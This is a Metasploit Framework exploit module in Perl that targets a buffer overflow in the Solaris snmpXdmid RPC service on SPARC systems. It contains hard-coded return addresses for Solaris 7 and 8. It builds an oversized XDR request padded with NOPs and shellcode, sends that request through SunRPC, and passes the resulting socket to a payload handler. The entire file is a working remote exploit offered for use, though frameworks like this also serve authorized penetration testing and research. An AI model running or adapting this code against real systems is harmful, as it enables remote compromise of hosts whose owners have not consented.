
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_snmpxdmid;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::SunRPC;
use Pex::XDR;

my $advanced = { };
my $info =
{
	'Name'  => 'Solaris snmpXdmid addcomponent overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'  => [ 'sparc' ],
	'OS'    => [ 'solaris' ],
	'Priv'  => 1,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target RPC port', 111],
	},
	'Payload' => {
		'Space' => 64000,
		'MinNops' => 63000,
		'Keys' => ['+findsock'],
	},
	'Description'  => Pex::Text::Freeform(qq{
Based on LSD's solsparc_snmpxdmid.c
	}),
	'Refs'  =>  [
		['BID', 2417],
		['URL', 'http://lsd-pl.net/code/SOLARIS/solsparc_snmpxdmid.c'],
	],
# XXX: It should be possible to make this universal because the $target->[1] + 32000 on sol8
#   and the nops on sol7 line up. But how portable is this tech? (arch, os, connections made)
	'Targets' => [
		[ 'Solaris 7 / SPARC', 0xb1868 ],
		[ 'Solaris 8 / SPARC', 0xcf2c0 ],
	],
	'Keys'  => [''],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;

	my $target_idx = $self->GetVar('TARGET');
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my %data;

	if(Pex::SunRPC::Clnt_create(\%data, $self->GetVar('RHOST'), $self->GetVar('RPORT'), 100249, 1, "tcp") == -1)
	{
		$self->PrintLine("[*] RPC portmap getport request failed (snmpXdmid).");
		return;
	}

	$self->PrintLine("[*] Using port $data{'rport'}");
	Pex::SunRPC::Authunix_create(\%data, "localhost", 0, 0, []);
	$self->PrintLine("[*] Generating buffer...");

	my $array1 =
		(pack("N", ($target->[1] + 32000)) x (1248/4)).
		(pack("N", ($target->[1] + 96000)) x (352/4)).
		(pack("N", 0));

	my $array2 =
		(pack("N", 0) x (16000)).
		($shellcode).
		(pack("N", 0));

	my @array1_tbl = split(//, $array1);
	my @array2_tbl = split(//, $array2);

	for(my $i = 0; $i < scalar @array1_tbl; $i++)
	{
		$array1_tbl[$i] = unpack("C", $array1_tbl[$i]);
		if($array1_tbl[$i] & 0x80)
		{
			$array1_tbl[$i] |= 0xffffff00;
		}
	}
	for(my $i = 0; $i < scalar @array2_tbl; $i++)
	{
		$array2_tbl[$i] = unpack("C", $array2_tbl[$i]);
		if($array2_tbl[$i] & 0x80)
		{
			$array2_tbl[$i] |= 0xffffff00;
		}
	}

	my $buf =
		Pex::XDR::UInt(0).
		Pex::XDR::UInt(0). # ptr
		Pex::XDR::Bool(1).
		Pex::XDR::UInt(0).
		Pex::XDR::Bool(1).
		Pex::XDR::VArray([@array1_tbl], \&Pex::XDR::UInt).
		Pex::XDR::Bool(1).
		Pex::XDR::VArray([@array2_tbl], \&Pex::XDR::UInt).
		Pex::XDR::UInt(0). # ptr
		Pex::XDR::UInt(0);

	$self->PrintLine("[*] Sending payload...");

	if(Pex::SunRPC::Clnt_call(\%data, 0x101, $buf) == -1)
	{
		$self->PrintLine("[*] snmpXdmid addcomponent request failed.");
		return;
	}

	$self->PrintLine("[*] Sent!");

	$self->Handler($data{'sock'});

	return;
}
